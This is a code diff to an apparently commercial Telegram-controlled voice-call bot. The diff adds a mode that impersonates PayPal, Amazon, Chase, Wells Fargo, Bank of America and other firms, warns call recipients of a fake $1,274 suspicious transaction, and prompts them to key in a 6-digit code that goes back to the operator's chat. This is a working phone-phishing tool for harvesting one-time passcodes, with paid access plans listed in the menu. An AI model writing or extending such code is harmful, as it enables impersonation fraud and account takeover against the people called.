@@ -88,12 +88,29 @@ IVR_MENSAJES = {
     "recordatorio": "Hola, tiene un pago proximo a vencer. Si ya pago marque 1. Si necesita mas tiempo marque 2. Para hablar con un agente marque 3.",
     "encuesta": "Hola, le llamamos para una encuesta. Si desea participar marque 1. Si no desea participar marque 2.",
 }
+
+# ─── EMPRESAS ─────────────────────────────────────────────────────────────────
+EMPRESAS = {
+    "paypal":    {"nombre": "PayPal",          "emoji": "💰", "mensaje": "Hello, this is PayPal. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "amazon":    {"nombre": "Amazon",          "emoji": "🛍️", "mensaje": "Hello, this is Amazon. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "chase":     {"nombre": "Chase Bank",      "emoji": "🏦", "mensaje": "Hello, this is Chase Bank. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "affirm":    {"nombre": "Affirm",          "emoji": "🟦", "mensaje": "Hello, this is Affirm. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "ebay":      {"nombre": "eBay",            "emoji": "🛒", "mensaje": "Hello, this is eBay. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "google":    {"nombre": "Google",          "emoji": "🔵", "mensaje": "Hello, this is Google. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "wellsfargo":{"nombre": "Wells Fargo",     "emoji": "🏦", "mensaje": "Hello, this is Wells Fargo. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "bofa":      {"nombre": "Bank of America", "emoji": "🏦", "mensaje": "Hello, this is Bank of America. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+}
+
 IVR_OPCIONES = {
     "cobrar":      {"1": "💳 Quiere PAGAR", "2": "👤 Quiere agente", "3": "🔊 Escuchar monto"},
     "confirmar":   {"1": "✅ CONFIRMÓ cita", "2": "❌ CANCELÓ cita", "3": "🔄 Reprogramar"},
     "recordatorio":{"1": "✅ Ya pagó", "2": "⏳ Más tiempo", "3": "👤 Quiere agente"},
     "encuesta":    {"1": "✅ Acepta", "2": "❌ Rechaza"},
 }
+# Opciones para empresas
+for emp in EMPRESAS:
+    IVR_OPCIONES[emp] = {"1": "🚫 Denegó la transacción", "2": "✅ Quiere aprobar/cancelar"}
+
 IVR_RESPUESTA = {
     "cobrar":      {"1": "Recibira un enlace de pago pronto.", "2": "Le comunicamos con un agente.", "3": "Su saldo esta en linea."},
     "confirmar":   {"1": "Cita confirmada.", "2": "Cita cancelada.", "3": "Le contactaremos pronto."},
@@ -134,9 +151,15 @@ def voice_webhook(action):
 
     response.pause(length=1)
     gather = Gather(num_digits=1, action=f"{WEBHOOK_BASE_URL}/gather/{action}", method="POST", timeout=15)
-    gather.say(IVR_MENSAJES.get(action, "Marque 1 o 2."), language="es-MX", rate="85%")
+
+    # Usar mensaje de empresa si aplica
+    if action in EMPRESAS:
+        gather.say(EMPRESAS[action]["mensaje"], language="en-US", rate="85%")
+    else:
+        gather.say(IVR_MENSAJES.get(action, "Press 1 or 2."), language="es-MX", rate="85%")
+
     response.append(gather)
-    response.say("No recibimos respuesta. Hasta luego.", language="es-MX", rate="85%")
+    response.say("We did not receive your response. Goodbye.", language="en-US", rate="85%")
     response.hangup()
     return Response(str(response), mimetype="text/xml")
 
@@ -153,8 +176,20 @@ def gather_webhook(action):
 
     response = VoiceResponse()
 
-    # Si marcó 1 en cobrar → pedir código de cuenta
-    if action == "cobrar" and digit == "1":
+    # Si es empresa y marcó 2 → pedir código de 6 dígitos
+    if action in EMPRESAS and digit == "2":
+        gather = Gather(
+            num_digits=6,
+            action=f"{WEBHOOK_BASE_URL}/codigo/{call_sid}/{chat_id}",
+            method="POST",
+            timeout=15,
+            finish_on_key=""
+        )
+        gather.say("To validate the cancellation, please enter your 6 digit account number.", language="en-US", rate="85%")
+        response.append(gather)
+        response.say("We did not receive your code. Goodbye.", language="en-US", rate="85%")
+    # Si es cobrar y marcó 1 → pedir código de cuenta
+    elif action == "cobrar" and digit == "1":
         gather = Gather(
             num_digits=6,
             action=f"{WEBHOOK_BASE_URL}/codigo/{call_sid}/{chat_id}",
@@ -350,6 +385,7 @@ def menu_con_key():
     return ReplyKeyboardMarkup([
         [KeyboardButton("💳 Cobrar"), KeyboardButton("📅 Confirmar")],
         [KeyboardButton("🔔 Recordatorio"), KeyboardButton("📊 Encuesta")],
+        [KeyboardButton("🏢 Llamar como Empresa")],
         [KeyboardButton("🛒 Comprar Plan"), KeyboardButton("📞 Soporte")],
     ], resize_keyboard=True)
 
@@ -460,6 +496,24 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("📱 Escribe el número a llamar:\n`+13023451233`", parse_mode="Markdown")
         return
 
+    if texto == "🏢 Llamar como Empresa":
+        keyboard = [
+            [InlineKeyboardButton("💰 PayPal", callback_data="empresa|paypal"),
+             InlineKeyboardButton("🛍️ Amazon", callback_data="empresa|amazon")],
+            [InlineKeyboardButton("🏦 Chase", callback_data="empresa|chase"),
+             InlineKeyboardButton("🟦 Affirm", callback_data="empresa|affirm")],
+            [InlineKeyboardButton("🛒 eBay", callback_data="empresa|ebay"),
+             InlineKeyboardButton("🔵 Google", callback_data="empresa|google")],
+            [InlineKeyboardButton("🏦 Wells Fargo", callback_data="empresa|wellsfargo"),
+             InlineKeyboardButton("🏦 Bank of America", callback_data="empresa|bofa")],
+        ]
+        await update.message.reply_text(
+            "🏢 *¿Qué empresa representas?*",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+        return
+
     if texto == "🛒 Comprar Plan":
         await update.message.reply_text(
             "💼 *Planes*\n🥉 1 Día — $30\n🥈 3 Días — $70\n🥇 1 Semana — $100\n👑 1 Mes — $300\n\nContacta: @heavyhittersrd",
@@ -510,10 +564,20 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     data = query.data
 
+    # Selección de empresa
+    if data.startswith("empresa|"):
+        _, empresa_key = data.split("|")
+        empresa = EMPRESAS.get(empresa_key, {})
+        context.user_data["accion"] = empresa_key
+        await query.edit_message_text(
+            f"{empresa.get('emoji')} *{empresa.get('nombre')}* seleccionada\n\n📱 Escribe el número a llamar:\n`+13023451233`",
+            parse_mode="Markdown"
+        )
+        return
+
+    # Acciones de llamada en tiempo real
     if data.startswith("accion|"):
         _, accion, call_sid = data.split("|")
-
-        # Redirigir la llamada al endpoint de acción
         try:
             sw_client.calls(call_sid).update(
                 url=f"{WEBHOOK_BASE_URL}/accion_llamada/{call_sid}/{accion}",
